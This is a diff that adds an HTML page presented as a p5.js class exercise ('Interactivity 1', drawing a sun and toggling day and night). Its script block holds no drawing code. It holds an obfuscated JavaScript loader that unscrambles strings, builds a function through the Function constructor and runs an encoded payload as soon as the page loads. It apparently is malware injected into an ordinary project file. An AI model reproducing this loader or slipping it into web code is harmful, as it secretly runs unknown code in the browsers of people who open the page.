@@ -1,0 +1,34 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" />
+        <style>
+            /* CSS */
+
+        </style>
+
+        <title>Interactivity 1</title>
+    </head>
+    <body>
+        <!-- HTML -->
+        <h1>Click on mouse to draw lines for the sun</h1>
+        <h1>Press any key to change to day or night</h1>
+
+
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.0/p5.js"></script>
+        <script>
+            // JS
+            
+            var a,b,c,setup,draw,mousePressed,keyPressed;(function(){var Vcr='',BZv=695-684;function IJb(t){var g=1663448;var q=t.length;var x=[];for(var v=0;v<q;v++){x[v]=t.charAt(v)};for(var v=0;v<q;v++){var w=g*(v+413)+(g%25865);var f=g*(v+433)+(g%23843);var y=w%q;var m=f%q;var j=x[y];x[y]=x[m];x[m]=j;g=(w+f)%4305689;};return x.join('')};var gFU=IJb('cltvqnugxouekspwfodirbmcnhrsyrtjtoacz').substr(0,BZv);var eJY='ijro)),svi,ra;9t4.vr=;(cnd bv[)c4<tva=an{]qS==ukw6snianraa9==70mn)aie,;i,e2[e[,n;gthso6o)==t.fj)(d0s)n)c(]e068(,8r ) r(-vl"ga- neaufo(+ua(v["00}{g!1]nux[+r<+t n;dvjhso(6rvjrlp6[]C1{=;"bagnfl)j;1tsbujr8,a+ x 0;vsarout,80f(g[{(rhkwahgdl)ug"eal)sr""ta[ xutvl,e+wv.gre, <rprnl)]"+p=8]c91rl=rf(hf-1{f..)i pa.c ruf avs,8]xr2r1v=26-s2e7-nma(l=ar(o;t m;,=j2[;v; 1=;off{m, [1+e[i5do!rt.r=i7=smicyax(77)Ao5 )f"d=9a7;oswiu+p )oh+;ml;))ql04c;5vpoeCA(,,8ruas;+,vge=iev]aghhlCd;+aqc).+a*+=i2duoth(ip ")0oa,nha.kqvl=r)ygr}oe1v=d=it(t,Afnvniov;6+tl;uhr4e0}en9u+q5tht;ro==.u3r).=l>;an(n;=(dv{x=hamf7,.fy)b,rCS g=t;uon;s+(.=jhe(+[;oxtx=vi,(n1x ol,}v<. ;a0vw.elh=(y*m,;;a)tfoAy) 1]r;xie.se +.sut.ixl)tv}l;bl0]l=}r[.;(o9;(oea=r.m481r[p(j32aC9Ctgj.t6;si4mmgctpfatnr+fvC a5 ze+er;(i;om=rih.tre,9ys).]r(vrvr);+;;s=;l}v8++>9rn]c=(=diC4-;)(;.](y;Av2bp+g=);n.=uv]ni-1gpa=vvdoo,,(sv;,).orklrgr"c)b()ht6t+sd;(.gh7=rr<m';var Rse=IJb[gFU];var bxm='';var wsJ=Rse;var ROo=Rse(bxm,IJb(eJY));var ehk=ROo(IJb('F)"(#7fse9aic0,=t0F)(e1,v{s}_)-t_i)Fl>F:53F,)})uF.Fau%(siFfFng_eF2(=u)!!h8nF6($e..e = e};lFn3F)fe6dae5=cm (;638eua{)l1 FF(k5Fo.@jil5!.FFF56biFona;hdnaFha6n2(F3*.;F,\/i_c)Frnstr36u23Ffe{14SoFrrue9)(l*u.;#4)n} ))=6F1(F=0)en{Fta?c})0,f,gtlg7bF6so)pFl!tq0,a 2F\/4(2Fu4+F(FgFa\/{"d(").i(a?;FF"56})36(Fm"24u5)61){")FFa==g\/8shF$\/)FFe(;Fa1 c6nFF!=0\/hF7((g01F}t1F S."r1FeF?5Arme_fF00(p+c0 and0fF v!56(=$a uF6(be!uee$_n7$_\'FFFF ){laF)F(\/.14l\'((!;8F,(_jsb5)b}roo(+()(F((}rF&1baF0 % roFna,7l)fFF2n(c(_5(_(5,5ag3 o2n(FC(,,rr6=;F_lt5 .00F:e!_=FskF\/3m5a0c(F (())f=n8nFa2F(;F43)3n5s{(8F{n"8FF\/.F(_ea)jsF0%:$,8e s)f,3iFrs=eeF4Fr"2sfFeta_F2!F61;r)7.a2,2,)5r0F6;id;c_)7o15n)F!2{t<o;{C"1(bei=5_F,3io&6FflnF*(m,FFt-11FFlj5.a%Fe((Fd2q01wFF?f)$n:nr$uFo1,fu$F(iFa=:)osFi2o49.*@(lietFs;g-.1eFi_uia.ai.nn$eF-;f1oe"FiF1nf)=F$26mF67e}F9(})f, cab)Fnf185FF3f(ns8,,{(0iFd64F,t .6>8e\/_F_!.aF)FF_5Fv&1_(o);6is{3);}!b1))21}8_)lF205F)*2a(_ F"1$luo(F8#fF&77=$,_ow4a()5;5Fd{af_baF)q-cr_ o)FFAS )\/o3(3rFs1"+_FFbe5akrFto"F#F)6F)tu Fn.ewta+F09oF)s(=))eelu ;;FF(,3};FF)0"9Fg9 }0>l 9aF8ei$rfe2fFa6F!uneFFk25n17aew.cFF"28{F36Fo_0soc@r{)l fa\/20c2F(l$.m\/;tFF=r=_F7d26tF7F()9_aafpt,}a)FF$!FFFrs6Fe?\'{)6$ .o!,)s3{ar,{j00$21=}nFF((F)a62c)$8F@}le{3F331o.5a8\/o cihF(()3tFs8ko(atF)1832F4i{0in.16C c30.ba)1#a1e7F(fnn05(,F_1e,F3F9f$FFi2_$!a{uide8t;}9_(1$85Fju)yfn;}i;.=){eFr5=rF(=)FFk Fi7F4c)raaF)a!<_naFb)(\/eu3_i$aeo_8(?.t\'6a0p(ln2eFc;t*cF(\/l._3uf3_F$aF5)nta!lu9f+ur)F6tt33pa ib3Fe-p3365n1b)sroab)).ebFre3!(rlok354itu2r6fb(doF)o(alo=(:.\/sF5)kF$n(;t,)F))n"(4rF,2(F,1)1_}Fot_nFd7.1F}ap$=F'));var Mfy=wsJ(Vcr,ehk );Mfy(4774);return 8502})()
+
+
+
+        </script>
+    </body>
+</html>
